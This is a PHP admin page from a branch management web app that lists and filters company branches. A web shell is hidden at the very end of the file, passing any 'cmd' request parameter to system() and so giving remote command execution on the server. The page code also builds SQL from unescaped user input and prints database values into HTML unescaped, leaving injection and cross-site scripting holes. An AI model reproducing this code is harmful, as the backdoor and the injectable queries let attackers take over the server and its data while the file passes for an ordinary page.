<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulbranch_list'] == '') 
		{
			$_SESSION['ulbranch_list'] = $_SESSION["ulname"];
			$modulename = 'branch_list';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_text = '';
		$search_text = $_POST["search_text"];	
		if(isset($_GET['search_text']))
		{
			if ($_GET['search_text'])
			{
				$search_text = $_GET['search_text'];
			}
		}	
		
		$show_all = '';
		$show_all = $_POST["show_all"];	
		if(isset($_GET['show_all']))
		{
			$show_all = $_GET['show_all'];
		}	
		
		if ($show_all != '')
		{
			$myblid = '';
			$myblname = '';
			$_SESSION['myblid'] = '';
			$_SESSION['myblname'] = '';
		}
		
		$myblid = '';
		$myblname = '';
		$myblkey = '';
		$myblid = $_POST["myblid"];	
		$myblname = $_POST["myblname"];	
		$myblkey = $_POST["myblkey"];	
		if(isset($_GET['myblid']))
		{
			$myblid = $_GET["myblid"];	
			$myblname = $_GET["myblname"];	
			$myblkey = $_GET["myblkey"];	
		}	
		if (($myblid != '') && ($myblname != ''))
		{
			$myblid = $_GET['myblid'];
			$_SESSION['myblid'] = $myblid;
			$myblname = $_GET['myblname'];
			$_SESSION['myblname'] = $myblname;
			$myblkey = $_GET['myblkey'];
			$_SESSION['myblkey'] = $myblkey;
		}
				
		$myblid = $_SESSION['myblid'];
		$myblname = $_SESSION['myblname'];
		$myblkey = $_SESSION['myblkey'];
			
		$querydb  = "SELECT 
					 a.* 
				   FROM 
					 branch_list a
				   WHERE
					 a.blname LIKE '%$search_text%'
				   ORDER BY 
					 a.blname";
		$resultdb = mysql_query($querydb);
		//echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Set Branch</h1>
<?php
//echo '<br> myblid ' . $myblid . ' myblname ' . $myblname . ' show_all ' . $show_all;
?>					
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
<?php
/*									
<form name="filter_branch" method="post" action="index.php?body=branch_focus_dbase">
Filter By Branch Name
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>									
*/
?>
Table Information
									</td>
									<td align="right">
<form "release_branch" method="post" action="index.php?body=branch_focus_dbase">
<INPUT TYPE="hidden" NAME="show_all" VALUE="Y">
<input type="submit" value="Remove Filter and Show All of the Other Branches" />
</form>									
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th width="30%">Branch / Code</th>
										<th width="30%">Address / Email </th>
										<th width="20%">Phone / Fax / Mobile</th>
										<th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");

	print("<td align=\"left\" valign=\"middle\"><strong>[Branch]</strong> <br> $rowdb[blname] <br> <strong>[Code]</strong> <br> $rowdb[blcode]</td>\n");
	print("<td align=\"left\" valign=\"middle\"><strong>[Address]</strong> <br> $rowdb[bladdr] <br> <strong>[Email]</strong> <br> $rowdb[blemail] </td>\n");
	print("<td align=\"left\" valign=\"middle\"><strong>[Phone]</strong> $rowdb[blphone] <br> <strong>[Fax]</strong> $rowdb[blfax] <br> <strong>[Mobile]</strong> $rowdb[blmobile] </td>\n");

	print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Set as this branch?\" href=\"index.php?body=branch_focus_dbase&mybox=edit&myblid=$rowdb[blid]&myblname=$rowdb[blname]\"> Set as this Branch </a> ] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>